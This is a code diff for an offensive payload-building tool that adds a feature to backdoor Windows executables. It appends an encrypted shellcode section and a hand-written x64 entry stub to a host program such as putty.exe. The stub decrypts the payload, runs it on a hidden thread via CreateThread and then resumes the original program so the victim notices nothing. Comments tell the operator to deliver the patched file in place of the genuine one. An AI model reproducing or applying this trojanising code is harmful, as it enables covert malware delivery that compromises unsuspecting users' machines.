@@ -131,11 +131,11 @@ ENC_NOTES = {
                         "symmetric crypto). The seed rides beside the blob.",
 }
 
-PE_INJ_NOTE = ("T1055.002 — run inside a host PE you supply (e.g. putty.exe): the loader "
-               "spawns it SUSPENDED, writes the shellcode into the child, then resumes the "
-               "host and fires the payload on a second thread. The real program opens and "
-               "runs normally; the payload executes beside it under the host's identity. "
-               "EXITFUNC=thread is forced so the payload never kills the host on exit.")
+PE_INJ_NOTE = ("T1055.002 — PE file embedding: the payload is patched INTO the host "
+               "executable you supply (e.g. putty.exe) as a new .pfsg section. The output "
+               "IS the host program — same name, icon, version info — it opens and runs "
+               "normally while an entry stub fires the shellcode on a second thread. "
+               "x64 hosts only; deliver the patched file instead of the original.")
 
 # ---------------------------------------------------------------------------
 # Small helpers
@@ -210,6 +210,172 @@ def c_array(data: bytes, name: str, per_line: int = 16) -> str:
     body = "\n".join(lines)
     return (f"unsigned char {name}[] = {{\n{body}\n}};\n"
             f"unsigned int {name}_len = {len(data)};")
+
+
+# ---------------------------------------------------------------------------
+# PE backdooring — append a payload section to a host executable
+# ---------------------------------------------------------------------------
+
+def _build_pe_stub(enc_len: int, exec_off: int, sec_rva: int, oep: int) -> bytes:
+    """x64 entry stub for the .pfsg section: decrypt the appended stage in
+    place (rolling XOR, 16-byte key), resolve CreateThread via
+    PEB -> Ldr -> kernel32 export-table walk, launch the decrypted shellcode
+    on a second thread, then jump to the original entry point so the host
+    program runs normally. Assembled at build time with keystone (module
+    optional only for this feature); all addressing is RBX-relative to the
+    real image base, so ASLR needs no relocations."""
+    try:
+        from keystone import Ks, KS_ARCH_X86, KS_MODE_64
+    except ImportError:
+        raise ForgeError("pip install keystone-engine  (required for PE embedding)")
+
+    lo, hi = b"CreateTh", b"ead\x00\x00\x00\x00\x00"
+    ct_lo = int.from_bytes(lo, "little")
+    ct_hi = int.from_bytes(hi, "little")
+    asm = f"""
+        push rbx
+        push r12
+        mov rax, gs:[0x60]
+        mov rbx, [rax+0x10]
+        lea rax, [rbx+{sec_rva}]
+        lea r8,  [rbx+{sec_rva + enc_len}]
+        xor rcx, rcx
+    dec_loop:
+        mov dl, [rax+rcx]
+        mov r9d, ecx
+        and r9d, 15
+        xor dl, [r8+r9]
+        mov [rax+rcx], dl
+        inc rcx
+        cmp rcx, {enc_len}
+        jb dec_loop
+        mov rax, gs:[0x60]
+        mov rcx, [rax+0x18]
+        lea rcx, [rcx+0x20]
+        mov rcx, [rcx]
+        mov rcx, [rcx]
+        mov rcx, [rcx]
+        mov rdx, [rcx+0x20]
+        mov eax, [rdx+0x3C]
+        mov r9d, [rdx+rax+0x88]
+        lea r10, [rdx+r9]
+        mov r11d, [r10+0x18]
+    names_loop:
+        test r11d, r11d
+        jz  done
+        dec r11d
+        mov eax, [r10+0x20]
+        lea rcx, [r10+rax]
+        mov ecx, [rcx+r11*4]
+        lea rcx, [rdx+rcx]
+        movabs rax, {ct_lo}
+        cmp [rcx], rax
+        jne names_loop
+        movabs rax, {ct_hi}
+        cmp [rcx+8], rax
+        jne names_loop
+        mov r12d, r11d
+        mov eax, [r10+0x1C]
+        lea r9, [r10+rax]
+        mov eax, [r10+0x24]
+        lea r11, [r10+rax]
+        movzx ecx, word ptr [r11+r12*2]
+        mov ecx, [r9+rcx*4]
+        lea r10, [rdx+rcx]
+        sub rsp, 0x38
+        mov qword ptr [rsp+0x28], 0
+        mov qword ptr [rsp+0x20], 0
+        xor r9d, r9d
+        lea r8, [rbx+{sec_rva + exec_off}]
+        xor edx, edx
+        xor ecx, ecx
+        call r10
+        add rsp, 0x38
+    done:
+        pop r12
+        pop rbx
+    """
+    ks = Ks(KS_ARCH_X86, KS_MODE_64)
+    body, _ = ks.asm(asm)
+    code = bytearray(body) + b"\xe9\x00\x00\x00\x00"   # jmp rel32 -> OEP
+
+    import struct as st
+    jmp_at = len(code) - 5
+    # the stub lives at sec_rva + exec_off (after enc+key), so the jump's
+    # end VA is base + sec_rva + exec_off + jmp_at + 5
+    st.pack_into("<i", code, jmp_at + 1,
+                 oep - (sec_rva + exec_off + jmp_at + 5))
+    return bytes(code)
+
+
+def patch_pe(host: bytes, sc: bytes, key: bytes) -> bytes:
+    """Backdoor a copy of host: append a .pfsg section holding the XOR-encrypted
+    shellcode + key + entry stub, and repoint the entry to the stub. The result
+    IS the host program (same name, icon, version info) — it runs normally and
+    the payload executes beside it on a second thread."""
+    import struct as st
+    if host[:2] != b"MZ":
+        raise ForgeError("host file has no MZ signature — is it a Windows PE?")
+    e_lfanew = st.unpack_from("<I", host, 0x3C)[0]
+    if host[e_lfanew:e_lfanew + 4] != b"PE\x00\x00":
+        raise ForgeError("bad PE signature in host file")
+    machine = st.unpack_from("<H", host, e_lfanew + 4)[0]
+    if machine != 0x8664:
+        raise ForgeError("host PE is not x64 — choose a 64-bit host executable "
+                         "(x86 host embedding is not supported)")
+    nsec_off = e_lfanew + 6
+    nsec = st.unpack_from("<H", host, nsec_off)[0]
+    if nsec >= 88:
+        raise ForgeError("host PE section table is full")
+    soh = st.unpack_from("<H", host, e_lfanew + 20)[0]
+    opt = e_lfanew + 24
+    if st.unpack_from("<H", host, opt)[0] != 0x20B:
+        raise ForgeError("host PE is 32-bit (PE32) — need a 64-bit (PE32+) host")
+    sec_align = st.unpack_from("<I", host, opt + 32)[0]
+    file_align = st.unpack_from("<I", host, opt + 36)[0]
+    size_of_image = st.unpack_from("<I", host, opt + 56)[0]
+    size_of_headers = st.unpack_from("<I", host, opt + 60)[0]
+    oep = st.unpack_from("<I", host, opt + 16)[0]
+    first_sec = opt + soh
+    if first_sec + (nsec + 1) * 40 > size_of_headers:
+        raise ForgeError("no room in the PE header for another section")
+
+    raw_end = size_of_headers
+    rva_end = 0
+    for i in range(nsec):
+        h = first_sec + i * 40
+        vr, va, rs, pr = st.unpack_from("<IIII", host, h + 8)
+        raw_end = max(raw_end, pr + rs)
+        rva_end = max(rva_end, va + vr)
+    sec_rva = (rva_end + sec_align - 1) // sec_align * sec_align
+    sec_raw = (raw_end + file_align - 1) // file_align * file_align
+
+    if len(key) != 16:
+        key = (key + b"\x00" * 16)[:16]
+    enc = xor_crypt(sc, key)
+    exec_off = len(enc) + len(key)
+    stub = _build_pe_stub(len(enc), exec_off, sec_rva, oep)
+    stage = enc + key + stub
+    sec_vsize = len(stage)
+    sec_rsize = (len(stage) + file_align - 1) // file_align * file_align
+
+    out = bytearray(host)
+    if len(out) < sec_raw:
+        out.extend(b"\x00" * (sec_raw - len(out)))
+    out.extend(b"\x00" * (sec_rsize - (len(out) - sec_raw)))
+    out[sec_raw:sec_raw + len(stage)] = stage
+
+    hdr = bytearray(40)
+    hdr[0:8] = b".pfsg\x00\x00\x00"
+    st.pack_into("<IIII", hdr, 8, sec_vsize, sec_rva, sec_rsize, sec_raw)
+    st.pack_into("<I", hdr, 36, 0x60000020)     # CODE | EXECUTE | READ
+    out[first_sec + nsec * 40: first_sec + (nsec + 1) * 40] = hdr
+    st.pack_into("<H", out, nsec_off, nsec + 1)
+    st.pack_into("<I", out, opt + 56,
+                 size_of_image + (sec_rsize + sec_align - 1) // sec_align * sec_align)
+    st.pack_into("<I", out, opt + 16, sec_rva + exec_off)   # entry -> stub
+    st.pack_into("<I", out, opt + 64, 0)                    # checksum: Windows ignores for EXE
+    return bytes(out)
 
 
 def log_line(tag: str, msg: str) -> str:
@@ -977,6 +1143,51 @@ class Forge:
         else:
             self.log("[!] macOS Mach-O can't be built from Linux — run build.sh on a mac (clang) or with osxcross")
 
+    def embed_into_pe(self, cfg, shellcode: bytes, host: bytes) -> str:
+        """T1055.002 file embedding — the deliverable IS the host executable.
+        Appends a .pfsg section to the host PE with the encrypted shellcode and
+        an x64 entry stub: stub decrypts the stage, fires it on a second thread
+        via CreateThread, then jumps to the original entry point, so the host
+        program opens and runs completely normally. No separate loader, no
+        spawned process — one file in, one file out."""
+        buildid = "PF-" + rnd_hex(3).upper()
+        outdir = os.path.join(OUT_DIR, f"{safe_name(buildid)}-PEEmbed")
+        os.makedirs(outdir, exist_ok=True)
+
+        enc = "XOR Dynamic"
+        if cfg.get("enc", enc) != enc:
+            self.log(f"[!] PE embedding uses in-stub XOR (stronger ciphers need a full "
+                     f"loader) — building with XOR Dynamic instead of {cfg.get('enc')}")
+        key = rnd_bytes(16)
+        self.log(f"[*] Encrypting with XOR Dynamic (key {key.hex()[:12]}...)")
+        self.log(f"[*] Patching payload into host PE (T1055.002 file embedding)")
+        try:
+            patched = patch_pe(host, shellcode, key)
+        except ForgeError as e:
+            self.log(f"[!] {e}")
+            raise
+        host_name = cfg.get("pe_name") or "host"
+        exe = os.path.join(outdir, host_name)
+        open(exe, "wb").write(patched)
+
+        meta = {
+            "build": buildid, "target": "Windows", "mode": "pe-embed",
+            "host": host_name, "payload": cfg.get("payload", ""),
+            "lhost": cfg.get("lhost", ""), "lport": cfg.get("lport", ""),
+            "enc": enc, "shellcode_len": len(shellcode),
+            "patched_len": len(patched), "host_len": len(host),
+            "mitre": ["T1055.002", "T1027"],
+            "key_hex": key.hex(),
+            "note": "entry -> .pfsg stub: decrypt, CreateThread(shellcode), jmp OEP",
+        }
+        open(os.path.join(outdir, "manifest.json"), "w").write(json.dumps(meta, indent=2))
+        open(os.path.join(outdir, "shellcode.bin"), "wb").write(shellcode)
+
+        self.log(f"[i] {PE_INJ_NOTE}")
+        self.log(f"[+] Embedded build: {exe} ({len(patched)} bytes — was {len(host)})")
+        self.log(f"[+] Done: {outdir}")
+        return outdir
+
     # -- build.sh writers ----------------------------------------------------
 
     def win_buildsh(self, cfg, outdir) -> str:
@@ -1009,6 +1220,7 @@ class Forge:
             if not pp or not os.path.exists(pp):
                 raise ForgeError("PE injection enabled but no PE file selected")
             pe_bytes = open(pp, "rb").read()
+            cfg["pe_name"] = os.path.basename(pp)
             self.log(f"[*] PE injection host: {os.path.basename(pp)} ({len(pe_bytes)} bytes)")
 
         if cfg["payload_type"] == "MSFvenom":
@@ -1038,6 +1250,10 @@ class Forge:
         else:
             shellcode = self.read_implant(cfg)
             cfg["kind"] = kind_of_implant(cfg["implant_path"])
+
+        # T1055.002 file embedding: patch the payload INTO the host executable
+        if pe_bytes and shellcode:
+            return self.embed_into_pe(cfg, shellcode, pe_bytes)
 
         return self.build(cfg, shellcode, pe_bytes)
 
